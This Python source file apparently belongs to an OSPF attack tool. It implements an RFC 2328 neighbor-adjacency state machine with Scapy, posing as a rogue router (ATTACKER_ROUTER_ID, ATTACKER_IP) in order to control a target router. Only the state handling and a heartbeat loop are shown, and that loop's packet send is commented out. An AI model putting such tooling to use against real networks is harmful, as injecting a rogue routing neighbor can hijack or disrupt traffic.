"""
OSPFv2 Neighbor Adjacency State Machine
RFC 2328 compliant FSM for controlling target OSPF router
"""

import time
import threading
from enum import Enum
from typing import Optional, Callable
from scapy.all import *
from scapy.contrib.ospf import *
from config import *


class OSPFState(Enum):
    """RFC 2328 Section 10.1 - Neighbor States"""
    DOWN = 0
    INIT = 1
    TWO_WAY = 2
    EXSTART = 3
    EXCHANGE = 4
    LOADING = 5
    FULL = 6


class OSPFNeighbor:
    """
    FSM that manages OSPF adjacency with a single target router.
    Reactive design: sniffs packets, extracts state, crafts responses.
    """
    
    def __init__(self, target_router_id: str, target_ip: str):
        # Identity
        self.target_router_id = target_router_id
        self.target_ip = target_ip
        self.our_router_id = ATTACKER_ROUTER_ID
        self.our_ip = ATTACKER_IP
        
        # FSM state
        self.state = OSPFState.DOWN
        self.state_lock = threading.Lock()
        
        # Protocol state
        self.target_priority = 0
        self.target_dr = "0.0.0.0"
        self.target_bdr = "0.0.0.0"
        self.last_hello_received = 0
        
        # ExStart/Exchange state
        self.master = False
        self.dd_sequence = int(time.time()) & 0xFFFFFFFF  # Initial DD seq
        self.target_dd_sequence = None
        self.received_lsa_headers = []  # LSAs we need to request
        self.sent_lsa_headers = []      # LSAs we've advertised
        
        # Retry mechanism
        self.max_retries = 3
        self.retry_timeout = 10  # seconds
        
        # Heartbeat
        self.heartbeat_interval = 10  # Hello interval
        self.heartbeat_thread = None
        self.heartbeat_running = False
        
        # Callbacks for state transitions
        self.state_callbacks = {}
    
    def get_state(self) -> OSPFState:
        """Thread-safe state getter"""
        with self.state_lock:
            return self.state
    
    def set_state(self, new_state: OSPFState):
        """Thread-safe state setter with callback support"""
        with self.state_lock:
            old_state = self.state
            self.state = new_state
            print(f"[FSM] State transition: {old_state.name} -> {new_state.name}")
            
            # Execute callback if registered
            if new_state in self.state_callbacks:
                self.state_callbacks[new_state]()
    
    def register_state_callback(self, state: OSPFState, callback: Callable):
        """Register callback to execute when entering a state"""
        self.state_callbacks[state] = callback
    
    def is_alive(self) -> bool:
        """Check if neighbor is alive based on dead interval"""
        if self.last_hello_received == 0:
            return False
        elapsed = time.time() - self.last_hello_received
        return elapsed < 40  # Dead interval from config
    
    def start_heartbeat(self):
        """Start background thread sending periodic Hello packets"""
        if self.heartbeat_running:
            return
        
        self.heartbeat_running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        print(f"[HEARTBEAT] Started (interval={self.heartbeat_interval}s)")
    
    def stop_heartbeat(self):
        """Stop heartbeat thread"""
        self.heartbeat_running = False
        if self.heartbeat_thread:
            self.heartbeat_thread.join(timeout=2)
        print("[HEARTBEAT] Stopped")
    
    def _heartbeat_loop(self):
        """Background loop sending Hello packets"""
        from ospf_packets import build_hello_packet
        
        while self.heartbeat_running:
            try:
                # Only send Hello if we're past INIT
                if self.get_state().value >= OSPFState.TWO_WAY.value:
                    neighbors = [self.target_router_id]
                else:
                    neighbors = []
                
                # pkt = build_hello_packet(neighbors)
                # sendp(pkt, iface=IFACE, verbose=False)
                print(f"[HEARTBEAT] Hello sent (neighbors={neighbors})")
                
            except Exception as e:
                print(f"[HEARTBEAT] Error: {e}")
            
            time.sleep(self.heartbeat_interval)
